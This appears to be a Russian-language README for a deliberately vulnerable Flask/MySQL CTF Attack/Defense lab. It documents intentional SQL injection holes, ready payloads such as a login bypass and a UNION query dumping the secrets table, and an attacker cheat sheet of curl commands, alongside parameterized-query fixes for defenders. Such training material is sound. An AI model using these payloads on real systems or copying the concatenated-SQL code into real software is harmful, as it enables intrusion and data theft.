# 🗂 CTF A/D лаба: «Журнал сотрудников» (SQL Injection)

Учебный веб-сервис с **намеренными SQL-инъекциями** для тренировки формата
Attack/Defense. Стек минимально простой, чтобы участники-защитники могли
быстро прочитать и запатчить код:

| Компонент | Технология |
|---|---|
| Веб-приложение | **Python 3.12 + Flask** (один файл `app/app.py`, ~200 строк) |
| База данных   | **MySQL 8.0** |
| Развертывание | **Docker Compose** (2 контейнера: `web` + `db`) |

🚩 Флаги хранятся в таблице `secrets` БД `ctf_lab`. Их можно украсть:
* через обход логина и вход админом → страница `/admin`;
* через UNION-инъекцию в поиске → прямо из строки запроса;
* напрямую из MySQL (порт 3306 открыт на хост — в реальной игре его не публикуют).

---

## Быстрый старт

```bash
cd sql-injection-lab
cp .env.example .env          # при желании поменяйте порты/пароли
docker compose up -d --build  # БД создастся и наполнится автоматически
```

Открыть: **http://localhost:8000**

Тестовые аккаунты (показаны прямо на странице входа):

| Логин | Пароль | Права |
|---|---|---|
| `admin` | `admin123` | видит флаги на `/admin` |
| `alice` | `alice123` | обычный пользователь |
| `bob`   | `bob123`   | обычный пользователь |

Остановка / полный сброс:

```bash
docker compose down           # остановить
./reset.sh                    # пересоздать БД с нуля (дефолтные флаги)
./reset.sh flags.txt          # пересоздать и залить СВОИ флаги (по одному в строке)
```

---

## Структура проекта

```
sql-injection-lab/
├── docker-compose.yml        # запуск web + db
├── .env.example              # порты и пароли (копируется в .env)
├── reset.sh                  # сброс лабы + загрузка боевых флагов
├── app/
│   ├── Dockerfile            # python:3.12-slim + flask
│   ├── requirements.txt      # flask, mysql-connector-python
│   └── app.py                # ВСЁ приложение (уязвимое, читается за 5 минут)
└── db/
    └── init/
        └── 01_schema.sql     # создание БД, таблиц, пользователей и флагов
```

### Какая должна быть БД

* СУБД: **MySQL 8.0** (образ `mysql:8.0`, аутентификация `mysql_native_password`).
* Имя базы: **`ctf_lab`**; подключается приложение пользователем **`root`**
  (пароль из `.env`, по умолчанию `ctf_root_pass`) — это тоже часть задания.
* Скрипты создания: каталог `db/init/` монтируется в `/docker-entrypoint-initdb.d`,
  поэтому при **первом** старте контейнера база создается автоматически.
  Если том `db_data` уже существует — скрипты НЕ применяются (нужен `reset.sh`
  или `docker compose down -v`).

Структура таблиц:

```sql
users(id, username, password /*md5(pass+salt)*/, salt, email, is_admin, created_at)
secrets(id, name, flag, owner, category)   -- <-- здесь флаги
```

---

## Уязвимости (для организаторов/разбора)

Все три — конкатенация пользовательского ввода в SQL-строку:

1. **`POST /login`** — классический обход аутентификации:
   ```python
   query = "SELECT * FROM users WHERE username = '" + username +
           "' AND password = MD5(CONCAT('" + password + "', salt))"
   ```
   Атака: `admin'-- -` в поле логина (войдёт первый пользователь — admin).

2. **`GET /users/search?q=`** — UNION-based инъекция (4 колонки видны в выводе):
   ```
   /users/search?q=' UNION SELECT id, flag, owner, 1 FROM secrets -- -
   ```
   (доступен залогиненным — сначала обход логина, либо аккаунт alice/bob).

3. **`GET /`** — значение cookie-сессии `user` попадает в `LIKE '%...%'`:
   если защитник уберёт экранирование/валидацию — инъекция через имя пользователя.

Бонус-дыры: подключение от `root`; показ сырых ошибок MySQL (подсказывает синтаксис);
открытый наружу порт 3306.

### Шпаргалка атакующего

```bash
# вход без пароля
curl -s -c jar -d "admin'-- -&password=x" http://localhost:8000/login -i
# кража флагов через UNION (нужна сессия любого пользователя)
curl -s -b jar "http://localhost:8000/users/search?q=%27%20UNION%20SELECT%20id,flag,owner,1%20FROM%20secrets--%20-"
# или напрямую к базе
docker compose exec db mysql -uroot -pctf_root_pass ctf_lab -e "SELECT flag FROM secrets"
```

### Варианты защиты (что может сделать команда Defense)

Код монтируется в контейнер (`./app:/srv/app`), поэтому патч = правка файла + рестарт:

```bash
vim app/app.py
docker compose restart web
```

Минимально правильный фикс — параметризованные запросы:

```python
cur.execute("SELECT * FROM users WHERE username=%s AND password=MD5(CONCAT(%s,salt))",
            (username, password))
...
cur.execute("SELECT id,username,email,is_admin FROM users WHERE username LIKE %s",
            ('%' + q + '%',))
```

Дополнительно (по очкам/желанию): закрыть вывод ошибок БД, заменить root на
`ctf_readonly` (уже создан в init-скрипте), убрать публикацию порта 3306,
добавить WAF-фильтр `'`/`UNION` (плохая защита, но в A/D встречается).

---

## Прогон перед игрой

```bash
docker compose up -d --build
sleep 20 && curl http://localhost:8000/health          # -> OK
curl -s http://localhost:8000/login | grep -o "Вход"   # страница живая
# убедиться, что дефолтная инъекция работает (см. шпаргалку выше)
./reset.sh my_flags.txt                                # боевые флаги
```

**Важно:** после загрузки боевых флагов проверьте, что уязвимость всё ещё даёт
их прочитать, а стандартные аккаунты работают — сервис считается живым, если
`GET /login` отвечает 200 и обычный вход `alice/alice123` успешен.
